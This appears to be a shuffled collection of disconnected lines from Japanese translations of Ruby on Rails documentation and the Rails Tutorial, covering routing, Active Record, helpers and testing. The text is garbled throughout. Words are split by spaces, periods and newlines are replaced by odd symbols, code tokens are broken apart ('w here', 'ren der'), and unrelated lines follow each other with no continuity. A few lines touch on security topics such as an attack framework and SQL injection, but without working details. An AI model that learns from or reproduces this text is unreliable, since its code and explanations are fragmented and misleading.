\ ref{ sec :a_users _ resource } で 、 アプリケーション の 振る舞い を 理解 する ため に \ kode { デバッグ 情報 } が 役 に 立 つ こと を 学 び ま し た 。
その オブジェクト が ` mid dleware ` メソッド に 応答 する 場合 、 その ミドルウェア を ミドルウェアスタック の ` Rack : : Runtime ` の 前 に 挿入 し ま す 。
ここ まで は ハッシュ の キー と し て 文字 列 を 使用 し て い ま し た が 、 Rails で は 文字 列 より も \emph { シンボル } を 使用 する 方 が 普通 で す 。
オプション の 引数 は ヘッダ 名 と 値 を ペア に し た ハッシュ 値 と し て 解釈 さ れ ま す 。
実際 の ユース ケース で ハード コード さ れ た リスト で 十分 で あ る こと が わか っ て い る 場合 に は 、 ` duplicable ? ` を お 使 い くださ い 。
[ Mpack ] ( http://pandalabs▖ pandasecurity▖ com/mpack -uncovered/ ) は 大変 活発 かつ 最新 の 攻撃 用 フレームワーク で あ り 、 これ ら の 脆弱 性 を 使用 し て い ま す 。
あ る アクション に 複数 の 異な る テンプレート が あ る と 、 Action   Mailer に よ っ て 自動 的 に マルチ パート 形式 の メール が 送信 さ れ ま す 。
*  `reverse_order `
| config/ | アプリケーション の 設定 ファイル   ( ルーティング 、 データベース など )   が ここ に 置 か れ ま す 。
*   リクエスト の 処理 を 開始 し た こと を 、 ログ に 書き出 し ま す 。
この コード は リスト \ ref{ code :micropost _belongs_to_user_ spec } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
別 の ページ   ( Home ページ など )   に い ったん 移動 する
##### `: class_ name `
╼ included in   all  copies or   substantial   portions   of  the   Software ▖
\ kode{gravatar \_ for } ヘルパー を 組み込 ん だ 結果 を リスト \ ref{ code :gravatar _ for _helper } に 示 し ま し た 。
= > #< Person   id :  nil ,   name :  " John   Doe " ,   created_at:  nil ,   updated_at:  nil >
###  Accessing
###  Action   Dispatch を 設定 する
いつ も の よう に マイグレーション を 実行 し ま す 。
  #  値 が 重複 し て い て も email を 更新 でき る
` Gemfile ` を 以下 の よう に 変更 し ま す 。
Sprockets が フィンガー プリント を 使用 する 際 に は 、 ファイル の 内容 を ハッシュ 化 し た もの を ファイル 名   ( 通常 は 末尾 )   に 追加 し ま す 。
|   POST       | / magazines/: magazine _ id/ads           |  ads # create        |  ある 1 冊 の 雑誌 用 の 広告 を 1 つ 作成 する                            |
\ ref{ sec :hello_ world } で は MVC を 使用 する お 試 し アプリケーション を ご覧 に 入れ ま す ▟ \ ref{ sec : mvc_ in_action } で は 、 この toy アプリ を 使 っ て MVC の 詳細 を 解説 し ま す 。
# <User   id :   3 ,   name :  " Foo " ,  email :   " foo@bar▖ com " ,   created_at:   " 2013 - 0 3 - 1 1
# => { " a " = > 2 }
これ は リスト \ ref{ code :microposts_create_tests } で 使用 さ れ て い ま し た 。
新規 の マイクロ ポスト が この 方法 で 作成 さ れ る 場合 、 \ kode {user_ id } は \emph { 自動 的 } に 正し い 値 に 設定 さ れ ま す 。
足り な い テスト は な い か 。
NOTE : _ ユーザー が 入力 し た データ を コマンドライン の オプション に 使用 する 場合 は 十分 に 注意 し て くださ い 。
```nginx
フォーム 送信 が 成功 し た 場合 に 何 ら か の 表示 を 行 い た い もの で す 。
どちら の 場合 も 、 図 \ ref { fig: riding _ rails } の よう に ブラウザ に Rails アプリケーション が 表示 さ れ ま す 。
t ▖ prev_quarter              # =>  Mon ,   0 8   Feb   2010
筆者 なら 即 、 この 時点 で 上 の メニュー を 記述 する 統合 テスト を 書 く で しょ う 。
` Array # to_ param ` を 実行 する と 、 ` to_ param ` が 配列 内 の 各 要素 に 対 し て 実行 さ れ 、 結果 が " / " で join さ れ ま す 。
( 表 \ ref{table : RESTful_ users } の HTTP メソッド と REST アクション の 関連 付け を 思い出 し ま しょ う ) 。
# bcrypt ' の コスト 関数 を 下げ る こと で テスト の 速度 を 向上 さ せ る 。
person   =   Person ▖ new ( name :  " John   Doe " )
#   Rails ▖ backtrace _ cleaner ▖ remove_ silencers !
StaticPages コントローラ 内 の \ kode { home } アクション と \ kode {help } アクション で 使用 する ルーティング
` Rails : : Server ` クラス は ` Rack : : Server ` クラス を 継承 し て お り 、 以下 の よう に し て ` Rack : : Server # start ` を 呼び出 し ま す 。
これ は リスト \ ref{ code :user_ show _ page_test } で 使用 さ れ て い ま し た 。
修正 さ れ た Home ページ
新し く 作成 し た エンジン の ルート ディレクトリ に は 、 `blorgh ▖ gemspec ` と い う ファイル が 置 か れ ま す 。
フレンド リー フォワーディング と は 、 ログ イン 成功 時 に 元々 行 き た かっ た ページ に 転送 さ せ る 機能 で あ る
( この 理由 から 、 いく つ か の 言語   ( 特に Perl )   で は ハッシュ を \emph { 連想 配列 } と 呼 ぶ こと も あ り ま す ) 。
ただし 、 エンコーダ が 書き直 さ れ た 際 に 以下 の 機能 が エンコーダ から 削除 さ れ ま し た 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/string / starts_ends_with ▖rb ` で す 。
*   Postgre SQL :   [Using   EXPLAIN ] ( http://www ▖ postgresql▖org / docs/current/static/ u sing - explain▖html )
\ kode {belongs_to } 関連 付け を   Relationship モデル に 追加 する 。
customer=
この ヘルパー は デフォルト で は 文字 単位 で 長 さ を チェック し ま す が 、 `: tokenizer ` オプション を 使用 する こと で 他 の 方法 で 値 を 区分 する こと も でき ま す 。
以前 と 同じ 動作 に 戻 し た い 場合 は 、 `unscoped` 、 `unscope ` 、 `rewhere ` 、 また は ` except ` を 使用 し て ` default _scope ` の 条件 を 明示 的 に 除外 する 必要 が あ り ま す 。
###  EXPLAIN の 出力 結果 を 解釈 する
日付 を 移動 する 最も 一般 的 な 方法 は ` advance ` メソッド を 使用 する こと で す 。
     Supported  options   are :
Ruby   API   の オン ライン マニュアル を 見つけ て 、 Hash クラス の \ kode {merge } メソッド に つ い て 読 ん で み て くださ い 。
上 の コード を 使用 する 際 は 、 test グループ 内 で 自分 の システム に 該当 する 行 を 必ず コメント 解除 し て くださ い
###  Active   Support
この 節 で は 、 テスト を 自動 化 する \ href {https://github▖ com/guard/guard } { Guard } と い う gem の 使 い 方 を 紹介 し ま す 。
TIP:   この 手法 は 、 HTML コード の ごく 小 規模 な スニペット を 出力 し た い 場合 に 便利 で す 。
#  <objects type =" array " >
    has_many : confirmed_orders ,  -> {  w here   confirmed:  true   } ,
ren der  " / path/to/rails/app/views/books/edit "
強制 的 に プッシュ を 行 う と 、 リモート ブランチ の コミット が 失 わ れ る 危険 性 が あ り ま す の で 、 くれぐれ も ご 注意 くださ い 。
Gemfile
同様 に 、 サイン イン 成功 を テスト する ため に 以下 を 使用 でき ま す 。
つまり 、 ` Book ` と い う モデル クラス が あ る 場合 、 これ に 対応 する データベース の テーブル は 複数 形 の * * books * * に な り ま す 。
*   パーシャル を 使用 し て ビュー を DRY に する 方法
Rails で は 、 \emph { パーシャル   ( partial ) }   と 呼 ば れ る 機能 を 使用 し て これ を 実現 する こと が でき ま す 。
# = >  55 5 - 123 4
統合 テスト は 、 ブラウザ に よ る ページ 間 の 遷移 を 効率 的 に シミュレート する
上 の コード に よ っ て 以下 の HTML が 生成 さ れ ま す 。
キャッシュ を 読み出 さ ず に データベース から 直接 読み込 ま せ た い 場合 は 、 ` force_ reload ` の 引数 に ` true ` を 設定 し ま す 。
正し い ページ テンプレート が 描画 さ れ て い る か どう か 確かめ る
24 ,   25 ,   26 ,   27 ,   28 ,   29 ,   30 ,   31 ,   32 ,   33 ,  34 ,   35 ,  36 ,   37 ,   38 ,   39 ,   40 ,   41 ,   42 ,
< h 1 > Articles </ h 1 >
####  text _field
= >   1 ▖ ▖ 5
#  collection   has   not   been  loaded ,  it   is  equivalent  to   ( コレクション が 読み込 ま れ な かっ た 場合 は )
参考 :   \ href {https://github▖ com/mhartl/ rails_tutorial _ sublime_ text } { Rails   Tutorial   Sublime  Text } { p 1 } に あ る 説明 に 従 っ て 設定 する こと も でき ま す 。
リスト \ ref{ code :micropost _access_control } の テスト に パス する ため に は 、 少し アプリケーション 側 の コード を リファクタリング し て お く 必要 が あ り ま す 。
self を 省略 し た 結果 を リスト \ ref{ code : full_title_helper_tests } に 示 し ま す 。
###  Rails 環境 を 作成 する
同様 に 、 " an   SQLite  database " の よう に する こと 。
置き 場所 は やはり `/articles/new ` で しょ う 。
TIP:  `rails   new - h ` を 実行 する と 、 Rails アプリケーション ビルダ で 使用 でき る すべて の コマンドライン オプション を 確認 でき ま す 。
###  Class 属性
実 に クール だ と 思 い ま す が 、 いかが で しょ う か 。
Active   Support で は 、 ` Date▖ current ` を 定義 し て 現在 の タイム ゾーン に お け る 「 今日 」 を 定め て い ま す 。
\ kode {hello\_app } ディレクトリ に あ る デフォルト の \ kode { Gemfile } 。
` to_sentence ` メソッド は 、 配列 を 変換 し て 、 要素 を 列挙 する 英文 に し ま す 。
\ href { http://on line ▖pragmaticstudio▖ com/}{ Pragmatic   Studio } : Mike   Clark と Nicole   Clark が 教鞭 を 執 っ て い る オン ライン の Rails クラス で す 。
invoke      test _unit
123456 78 ▖ 0 5 ▖ to_s(: delimited )                   # = >  12 , 345 ,67 8 ▖ 0 5
Rails に は フック 可能 な 初期 化 イベント が 5 つ あ り ま す ▟ 以下 に 紹介 する これ ら の イベント は 、 実際 に 実行 さ れ る 順序 で 掲載 し て い ま す 。
リスト \ ref{ code : first _create_action } の コード の 動作 を 理解 する もっとも よ い 方法 は 、 実際 に 無効 な ユーザー 登録 データ を \emph { 送信   ( submit ) } し て み る こと で す 。
   belongs_to  : imageable ,   polymorphic :  true
>> p ▖save
` body ` パラメータ は Sprockets で 必要 と な り ま す 。
最後 の コマンド で は 、 \ kode {static - pages } トピック ブランチ を Bitbucket に プッシュ し て い ま す 。
    add _header   Cache - Control   public ;
以下 の コード は 、
   validates  : age,  numericality :  true ,   on :  : update
#### ` reverse _update`
2 番 目 の ren der は 、 描画 し た い パーシャル テンプレート で あ る ` comments/form ` を 単純 に 定義 し て い る だけ で す 。
リスト \ ref{ code : respond_to_ password_digest } の とき
#  config ▖ assets▖manifest   =   該当 する パス
これ は 、 テスト の パス に 失敗 し た 後 に 、 他 の 余分 な テスト が 実行 さ れ な い よう に する ため の もの で す   ( Red - Green - Refactor の サイクル を 早め る ため ) 。
#  MyApp/app/models/blorgh/article ▖ rb
*  `config▖ action_view▖default _ form_builder ` は 、 Rails で デフォルト で 使用 する フォーム ビルダー を 指定 し ま す 。
新し い ` secrets▖yml ` に 秘密 鍵 を 保存 し た い 場合 は 以下 の 手順 を 実行 し ま す 。
ビュー その もの は 1 ページ の コード で す が 、 サイト の データベース から 取り出 し た 情報 を 使用 し て 各 プロファイル の 表示 を カスタマイズ し ま す 。
#   # => < label  for = " article_title " > Title< / label>
def  stringify _keys
カスタム ルール で 提供 する リスト \ ref{ code : following _ followers_ actions _ routes } の RESTful ルート
    app
今 は まだ 何 も あ り ま せ ん が 、 すぐ に デプロイ し て Web ページ を 表示 さ せ ま しょ う 。
` Array ` が 必要 な 場合 は ,   ` w here ( ▖▖▖) ▖ to_a ` を 使用 し て くださ い 。
   alias _ method   : original _ process ,  : process
数 分 待 っ て から ページ を 再度 読み込 む と 、 この テキスト は 自動 的 に 新し い 時間 に 基づ い て 更新 さ れ ま す 。
cookies は 今 から 20 年 後 に 切れ る   ( \ texttt { 20 ▖ years▖ from _now } )
Action   Pack など 、 特定 の コンポーネント の テスト のみ を 実行 する こと も でき ま す 。
上 の よう に 変更 し た こと で 、 新し い 記事 の 作成 が ようやく でき る よう に な り ま し た 。
上 の フォーム の コード で は 、 `@book ` インスタンス 変数 が ` nil ` 場合 に 問題 が 生じ る 可能 性 が あ り ま す 。
リクエスト と リクエスト の 合間 に 、 マニフェスト に 記載 さ れ て い る ファイル の いずれ か で 変更 が 生 じ た 場合 、 Rails サーバー は 新し く コンパイル さ れ た ファイル を レスポンス で 返 し ま す 。
#    Person ▖exists ? ( ['
###  Active   Record フィクスチャ で 定義 さ れ た メソッド
ルーティング グロブ   ( route   globbing )   と は ワイルド カード 展開 の こと で あ り 、 ルーティング の あ る 位置 から 下 の すべて の 部分 に 特定 の パラメータ を マッチ さ せ る 際 に 使用 し ま す 。
*   [ Ruby   on   Rails チュートリアル ] ( http://railstutorial▖ jp)
` is _mis sing ? ` メソッド は 、 この 2 つ の 場合 を 区別 する ため に 使用 さ れ ま す 。
\ label{ fig : micropost _ image_mockup}}╼\end { figure} ╼╼\ subsection { 基本 的 な 画像 アップロード } %  ( fold) ╼\ label{ sec : basic _ image_upload } ╼╼
これ に よ り 、 サイン イン の 状態 と 現在 の ユーザー id に 応 じ て 動作 を 変更 でき る よう に な り ま す 。
|   DELETE     | / magazines/: magazine _ id/ads/:id       |  ads # destroy       |  ある 雑誌 1 冊 に 含 ま れ る 広告 を 1 つ 削除 する                       |
root  to :   " home#index "
" " ▖html_safe  +  " < "  # => " &lt; "
#### ` has_and _belongs_to_many ` の オプション
You' re   free   to   add
ブロック フォーム を 使用 する こと で 、 多数 の ルーティング に 対 し て 1 つ の 制限 を まとめ て 与え る こと も でき ま す 。
assemblies ▖exists ? ( ▖▖▖)
    To   get  help  on this   sample  app ,  see   the
Array ▖wrap ( [ 1 ,   2 ,   3 ] )  # =>  [ 1 ,   2 ,   3 ]
{ 0 } Figure   4 ▖ 2 :   {/ 0 } { 1 } The  inheritance   hierarchy   for   the  ( non -built - in )   \kode { Word }  class   from   Listing   \ ref{ code :word_ class}▖{ / 1 }
\ kode {rake   test } は デフォルト で 、 テスト の 失敗 を 赤色 で 表示 し ま す が 、 テスト が パス し て も 緑色 で 表示 し ま せ ん 。
#   また Lifo : : Cache に {   page_cache:  false   } を 渡 す
` subclasses ` メソッド は レシーバ の サブ クラス を 返 し ま す 。
Rails を デフォルト で セキュア に する ため に 、 ` deep _munge ` メソッド は 一部 の 値 を ` nil ` に 置き換え ま す 。
ログ イン の しくみ が な い
 * = require_ self
簡単 な Cucumber の シナリオ を いく つ か 紹介 し た の で 、 それ ら と 同等 の RSpec の 例 と 比較 し て み ま しょ う 。
以下 を 実行 し て テスト スイート が パス する こと を 確認 し て から 先 に 進 む こと に し ま しょ う 。
そして 、 Ruby   ( および C 、 C + + 、 Perl 、 Python 、 Java など の 多く の プログラミング 言語 )   で は 、 上 の 演算 を 以下 の よう な 短縮 形 で 表記 する こと も でき ま す 。
一般 的 な ORM アプリケーション で は 特に この 傾向 が あ り ま す 。
*  `config ▖ exceptions_app ` は 、 例外 が 発生 し た とき に ShowException ミドルウェア に よ っ て 呼び出 さ れ る アプリケーション 例外 を 設定 し ま す 。
*   アプリケーション 開始 時 に 実行 し た い コード を 追加 する 方法
##### ` years_ago` 、 ` years_ since `
この 例 の 場合 、 `@customer▖ confirmed_orders▖ create ` また は `@ customer▖ confirmed_orders▖build ` を 実行 する と 、 confirmed カラム の 値 が ` true ` の 注文 ( order ) が 常 に 作成 さ れ ま す 。
####  必要 な 定義 だけ を 選 ぶ
*  `config▖ action_view▖cache_template_loading ` は 、 リクエスト の たび に ビュー テンプレート を 再 読み込 み する か ( = キャッシュ し な い か ) を 指定 し ま す 。
この オプション で は ` : yui ` と い う 一風 変わ っ た オプション を 指定 でき ま す ▟ これ は ` yui- compressor `   gem の こと で す 。
###  config/ environments/development ▖ rb
メール アドレス の 一意 性 を 強制 する ため の マイ グレーション
    has_and _belongs_to_many  : parts
` app/views/articles/new▖html ▖erb ` を エディタ で 開 き 、 ` form _ for ` の 行 を 以下 の よう に 変更 し ま す 。
1 ▖object _ id                  # = >   3
` through :  : sections ` と 指定 する こと に よ り 、 Rails は 以下 の 文 を 理解 でき る よう に な り ま す 。
c 1   =   Client ▖find ( 1 )
次 に 、 結果 の 最初 の ページ に 正し い ユーザー が 表示 さ れ て い る こと を 確認 し ま す 。
#### `titleize`
アプリケーション の プリ ローダー と し て Spring を 使用 する 場合 は 、 以下 を 行 う 必要 が あ り ま す 。
` app/views/books/index▖html ▖erb ` ビュー ファイル の 内容 が 以下 の よう に な っ て い る と し ま す 。
これ は リスト \ ref{ code : before_create_remember_token } で 使用 さ れ て い ま し た 。
# Blorgh/lib / concerns/models/article
これ は リスト \ ref{ code : signup _ form } で 使用 さ れ て い ま し た 。
関連 付け は 、 一種 の マクロ 的 な 呼び出し と し て 実装 さ れ て お り 、 これ に よ っ て モデル 間 の 関連 付け を 宣言 的 に 追加 する こと が でき ま す 。
上 の コード が 動作 する ため に 必要 な � パスワード 再 設定 用 メイラー メソッド は 、 \ ref{ sec : account_activation_emails } で 開発 し た アカウント 有効 化 用 メイラー メソッド と ほぼ 同じ で す 。
| ` Mouse `       | `mice `          |
I   shall  be   late ! " ▖ truncate_words ( 4 ,  omis sion :  '&hellip;')
d ▖ prev _week(:friday )      # =>  Fri ,   30   Apr  2010
` truncate_words ` メソッド は 、 指定 さ れ た ワード 数 から 後ろ を きりおと し た レシーバ の コピー を 返 し ま す 。
\ ref{ sec : basic _ image_upload } の アップ ローダー も 悪 く は あ り ま せ ん が 、 いく つ か の 目立 つ 欠点 が あ り ま す 。
マニフェスト 名 は Rails ヘルパー に よ っ て これ ら の フィンガー プリント 名 と 置き換え られ て 使用 さ れ ま す 。
( ハッシュ 化 と い う と 少し 困惑 し て しま う か も しれ ま せ ん 。
これ ら の メソッド の うち 、 ` association ` の 部分 は プレース ホルダ で あ り 、 ` belongs_to ` の 最初 の 引数 で あ る 関連 付け 名 を シンボル に し た もの に 置き換え られ ま す 。
stylesheet_url  " application "  # => http://www ▖example ▖ com/assets/application ▖css
    has_many  : books
do  | admin |
*  ** 主キー * * -  デフォルト で は   ` id `   と い う 名前 を 持 つ integer の カラム を テーブル の 主 キー と し て 使用 し ま す 。
ここ で は 、 \ kode {User ▖find } に ユーザー の id を 渡 し て い ま す ▟ その 結果 、 Active   Record は その id の ユーザー を 返 し ま す 。
\ kode { name :string } と \ kode {email : string } オプション を 追加 する こと で 、 User モデル の 内容 が 図 \ ref { fig: demo_user_ model } の 表 の とおり に な る よう に し ま す
以下 は Action   Controller の ` set_helpers_ path ` イニシャライザ から 取 っ た 例 で す 。
アプリケーション 全体 で 特定 の レイアウト を 使用 し た い 場合 は 、 ` Application Controller ` クラス で ` layout ` を 宣言 し ま す 。
言 う まで も な く 、 ` Engine ` クラス に ` isolate_namespace ` を 持 つ エンジン で この bin/rails を 使用 し て 生成 し た もの は すべて 名前 空間 化 さ れ る こと に ご 注意 くださ い 。
1 つ の 方法 は 、 id と 名前 を 組み合わせ て \ kode { @ 1 - michael - hartl } の よう に する こと で す 。
class   CreateOrders <  ActiveRecord : : Migration
  $ bun dle   exec   rake   - T
これ まで の 例 で は すべて \emph { ダブル クォート 文字 列 } を 使用 し て い ま し た が 、 Ruby で は \emph { シングル クォート } も サポート し て い ま す 。
ルーティング は 作成 し ま し た が 、 ルーティング 先 の コントローラ が まだ あ り ま せ ん 。
が 無事 に 動 き ま し た !
わざと 無効 な \ kode { params } ハッシュ を 使用 し て セッション 用 パス に POST する
         xml ▖pubDate (item_pubDate (item) )
   def  start
### `blank ? ` と ` present ? `
Connection :   keep- alive
class   Coffee  <  ActiveRecord : : Base
╼ * ----------------------------------------------------------------------------╼ */
リレーションシップ の 基本 的 な アクセス 制御 に 対 する テスト  
    <%=  f ▖ label  : text   %><br>
   - >   0 ▖ 0 1 15 s
# = >   1 ▖ 0 00,000 %
self を 省略 し た 結果 を リスト \ ref{ code : default _ gitignore } に 示 し ま す 。
class   GoodnessValidator
*  ` force_ plural ` は 、 モデル 名 を 複数 形 に する か どう か を 指定 し ま す 。
パスワード 再 設定 用 リソース を 追加 する
ネスト し た リソース の 中 で さらに 別 の リソース を ネスト する こと は 可能 で す 。
*   未 実行 の マイ グレーション が な い か 確認 し ま す ▟ 未 実行 の もの が あ っ た 場合 は 、 ` ActiveRecord : :PendingMigrationError ` を 発生 さま す 。
デフォルト の エラー メッセージ は  _ " must   be   less than or  equal  to %{ count }"_  で す 。
ren der   layout :  false
特定 の ` w here ` 句 で ` unscope ` を 指定 する こと も でき ま す 。
% w ( Earth) ▖ to_sentence             # => " Earth "
self を 省略 し た 結果 を リスト \ ref{ code :bootstrap_css } に 示 し ま す 。
*   マッチ する URL パターン
    <%=  f▖ text _field :title %>
` collection ▖ delete ` メソッド は 、 結合 テーブル 上 の レコード を 削除 し 、 それ に よ っ て 1 つ また は 複数 の オブジェクト を コレクション から 削除 し ま す 。
" true " および " false " を Ruby の 定義 どおり に 使用 する 場合 は 、 通常 の フォント で 表記 する こと 。
####  ネスト し た 関連 付け を 結合 する   ( 単一 レベル )
なぜ これ が ズル な の か と い う と 、 何 と \ kode { sign_in } は この 時点 で は 存在 し て い な い の で す 。
メッセージ は 72 文字 目 で 改行 し て くださ い 。
編集 の 成功 に 対 する テスト
get  'profile ' ,  to :  'users # show '
#     < id type =" integer " > 458 3 < / id >
その 逆 に 、 ユーザー が サイン イン し て い な い とき は これ ら の リンク が 表示 \ emph { さ れ な い } こと を 確認 する テスト も 追加 し て くださ い 。
  </ body >
これ は リスト \ ref{ code : home_feed_test } で 使用 さ れ て い ま し た 。
hash [ : b ] [: d ]  ==   [ 3 ,   4 ]    # => true
t ▖ next _ quarter              # =>  Sun ,   0 8   Aug  2010
#     <url- id > aaron - batalion< /url- id >
* `ActiveSupport: : Cache: : Strategy : : Local Cache ` は 基本 的 な メモリ バックアップ 式 キャッシュ と し て 機能 し ま す 。
第 2 版 と の 違い に つ い て
    <%  content_ for   :stylesheets  do  %>
大 改訂 を 行 っ た \emph { Ruby   on   Rails チュートリアル } 第 3 版 が 、 以前 の 版 より も さらに 多く の 読者 に と っ て 役立 つ こと を 願 っ て い ま す 。
ルーティング が 定義 さ れ た の で 、 Help 、 About 、 Contact ページ の テスト は パス する はず で す 。
set_callback   : save ,  :around ,  ->( r ,  &block )  { stuff ;   result   = block ▖ call ; stuff   }
この 更新 に は 、 領域   ( div タグ )   の 追加 、 CSS クラス の 追加 、 サイト ナビゲーション の 起点 と な る 領域 の 追加 も 含 ま れ ま す 。
例 を 挙げ ま す ▟ RedCloth は  `_test _` と い う マーク アップ を & lt;em&gt; test &lt;em&gt ; に 変換 し ま す ▟ この 箇所 の テキスト は イタリック に な り ま す 。
< しばらく 待 つ >
*  ` has_many : through `
\ kode {shuffle } メソッド を \ kode { String } クラス に 追加 する ため の 骨組み 。
### Update
#   非 JS / CSS ファイル が 追加 済み )   config ▖ assets▖precompile   + =  % w (  search ▖ js  )
これ で 、 `/photos ` へ の ` GET ` リクエスト は 成功 し 、 `/photos`   へ の ` POST ` リクエスト   ( 通常 で あ れ ば ` create ` アクション に ルーティング さ れ ま す )   は 失敗 し ま す 。
TIP:   SQL インジェクション の 詳細 に つ い て は [ Ruby   on   Rails セキュリティ ガイド ] ( security▖html#sql インジェクション ) を 参照 し て くださ い 。
\ kode {Users } で は な く \ kode {User } と し た の は この ため で す 。
この コマンド は 、 単に データベース を 更新 し 、 \ kode { users } データ モデル を 作成 する ため の もの で す
third :
The   result   is   that   the  \ kode { full \_title}   method   is   \ href { http://catb▖org /jargon/html / A/automagically▖html} { automagically}   available  in   all  our views▖
モデル に つ い て は 、 エンジン の 作成 に つ い て 解説 する セクション で 後述 し ま す 。
書 か れ た
** ` ActionDispatch : : Session : : CookieStore ` * *
     def  comment_ params
   def time_ since_ created
config ▖ assets▖digest が true に 設定 さ れ て い る 場合 、 ファイル 名 に フィンガー プリント が 追加 さ れ ま す 。
これ を 行 わ な かっ た 場合 、 Rails で エラー が 発生 し ま す 。
( やや 長 く て 応用 的 な 設定 な の で 、 リスト \ ref{ code : guardfile } を コピペ し て しま っ た 方 が よ い で しょ う )
`indent ! ` メソッド は インデント を その 場 で   ( 破壊 的 に )   行 い ま す 。
デフォルト の ルート ファイル の 内容 を 見 て み る と 、 かなり 乱雑 に な っ て い ま す ▟ しかし 、 それ ら は すべて コメント アウト さ れ た ルート マッピング の 例 で あ り 、 必要 な 乱雑 さ で す 。
[ 3 ▖ 4 ,   - 45 ▖ 6 ] ▖ to_query ( 'sample')
orphan▖ name  # => " M "
これ ら 以外 の オプション を 渡 す と 、 バリ データ クラス に ` options ` と し て 渡 さ れ ま す 。
これ は リスト \ ref{ code : password _ resets_resource } で 使用 さ れ て い ま し た 。
text _ area (:comment ,  : text ,   size:   " 20 x 30 " )
` multiple_of ? ` メソッド は 、 レシーバ の 整数 が 引数 の 倍数 で あ る か どう か を テスト し ま す 。
ログ イン に 失敗 し た とき の フラッシュ メッセージ
       add ( #{severity} ,  message ,   progname , &block )                     #    add ( DEBUG ,   message ,   progname , &block )
Java Script は ページ 上 の 情報 を 更新 する こと も でき ま す 。
Date:   Sun ,   24   Jan  2010   12 : 16 : 44   GMT
####  number_to_phone
` squish ` メソッド は 、 冒頭 と 末尾 の ホワイト スペース を 除去 し 、 連続 し た ホワイト スペース を 1 つ に 減ら し ま す 。
この メソッド は ブロック を 1 つ 取 り ま す 。
Ruby の ブロック は   ( 他 の 似 た 機能 と 比べ )   柔軟 な 機能 で 、 添え 字 を 使 っ た データ 構造 より も 自然 に イテレーション が でき る
Rails インストーラ   ( Windows )
この \ kode {session } メソッド は ハッシュ の よう に 扱え る の で 、 以下 の よう に 代入 し ま す 。
|   app/assets/stylesheets/ comment ▖ css ▖ scss      |  コントローラ 用 の CSS   ( カスケーディング スタイル シート )   ファイル   |
    Dir▖ chdir ( Rails ▖ application ▖ root )
以下 の コマンド を 実行 する こと で 、 すべて 正常 に インストール でき た か どう か を 確認 でき ま す 。
Flash メッセージ の キー は 文字 列 と 比較 し て くださ い 。
この 章 の 最初 に 、 フォロー し て い る ユーザー の ページ 表示 の 流れ に つ い て 説明 し ま し た 。
多く の コンピュータ プログラム で は 、 以下 の よう な 記法 で 変数 の 値 を 1 つ 増や す こと が でき ま す 。
つまり 、 有効 な メール アドレス だけ に マッチ し て 、 無効 な メール アドレス に は \emph { マッチ し な い } 正規 表現 を 組み立て る 必要 が あ り ま す 。
number   =   1
画像 アップロード に 対 する テスト は 、 演習 に 回 し ま す   ( \ ref{ sec : micropost _exercises} ) 。
リスト \ ref{ code : validates_presence _ of_ name } は 一見 魔法 の よう に 見え る か も しれ ま せ ん が 、 \ kode { validates } は 単なる メソッド で す 。
* `lock_ version ` -  モデル に [ optimistic   locking ] ( http://api▖ rubyonrails ▖org / classes /ActiveRecord / Locking ▖ html ) を 追加 し ま す
( 実際 、 \ texttt { routes▖rb }   ファイル に 自動 的 に 追加 さ れ た コード も 元 に 戻 す 必要 が あ り ま す )   。
*   リクエスト を 処理 する 度 に データベース へ の コネクション を コネクション プール に 返 し ま す ▟ ` env [ 'rack ▖ test '] `  が  ` true ` で な い 場合 のみ 返却 が 行 わ れ ま す 。
` config▖ autoload _once_ paths ` の デフォルト 値 は 、 空 の 配列 で す 。
そして 、 アプリケーション の コントローラ に 以下 の コード が あ る と し ま す 。
`~/my - test - app ` で 生成 さ れ た アプリケーション は ローカル ブランチ の コード を 実行 し ま す ▟ サーバー を 再 起動 する と 、 設定 の 変更 を アプリケーション で 確認 でき ま す 。
-----------
╼╼    \ subsection { インストール と セットアップ }╼    \ label{ sec : git_setup}╼╼
再度 Rails コンソール を 開 き 、 コンソール 上 で の 作業 を もう 一 度 やり直 し て み て くださ い
ルーティング の 詳細 に つ い て は 、 本 ガイド の [ Rails の ルーティング ] ( routing ▖ html ) を 参照 し て くださ い 。
条件 を 上書き する
MySpace の 本物 の Web ページ コンテンツ は 特殊 な HTML / CSS に よ っ て 覆い隠 さ れ 、 独自 の 偽 ログ イン ページ を 代り に 表示 し ま し た 。
変更 が 終わ っ た ら 、 ブランチ の 状態 を 確認 し て み ま しょ う 。
デフォルト の ルート ルーティング   ( コメント アウト さ れ た 状態 )
     create_table  : customers  do  |t |  
*  `active_ record ▖initialize_database` :   データベース 設定 を ` config/ database▖yml ` ( デフォルト の 読み込 み 元 ) から 読み込 み 、 現在 の 環境 で 接続 を 確立 し ま す 。
###  デフォルト の 出力 :   アクション に お け る 「 設定 より 規約 」
       create    app/views/static _ pages/help▖html ▖erb
ここ で も パーシャル を 使用 し て コード を きれい に し ま しょ う 。
Rails に よ っ て 多数 の ファイル が 作成 さ れ ま し た 。
config/ environments/production ▖ rb
続 い て この 変更 を コミット し 、 Heroku に プッシュ し ま す 。
これ ら の コード に よ り 、 ユーザー プロファイル を 表示 し て 、 ページ を 更新 せ ず に フォロー また は フォロー 解除 が でき る よう に な っ た はず で す ▟ テスト スイート も パス する はず で す 。
\ kode {about } 用 の ルート を 追加 する   RED { 3 } { 4 } { / 4 } { 4 } { 5 } { / 5 } { / 4 } { 4 } { / 4 } { / 3 }
疑わし い 場合 に は 公式 ドキュメント など 、 信頼 でき る 情報 源 を 参照 する こと 。
\ chapter { ほぼ 静的 な ページ の 作成 } ╼ \ label{ cha :static _ pages}╼╼
ルーティング ヘルパー の グループ に プレフィックス を 追加 する に は 、 以下 の よう に ` scope ` メソッド で ` : as ` オプション を 使用 し ま す 。
[ Contributor ▖ first ,   Commit ▖ first ] ▖ to _xml
  * `config/ routes▖rb ` ファイル
『 \ href { http://www ▖railstutorial ▖org / book } {\emph { Ruby   on   Rails チュートリアル :   Rails で Web 開発 を 学 ぶ } } 』 へ よ う こそ 。
*   空欄 の 配列 と ハッシュ
Rails を 使用 し て Web アプリケーション を 立ち上げ たり 実行 し たり する うえ で 助け が 必要 に な っ た ら 、 以下 の サポート 用 リソース を 自由 に 参照 でき ま す 。
             controller :  'welcome' ,
SELECT  *  FROM   clients   WHERE   orders_count  >   10   ORDER   BY  name   DESC
` collection ▖exists ? ` メソッド は 、 指定 さ れ た 条件 に 合 う オブジェクト が コレクション の 中 に 存在 する か どう か を チェック し ま す 。
Overwrite /myapp/config/ routes▖rb ?  
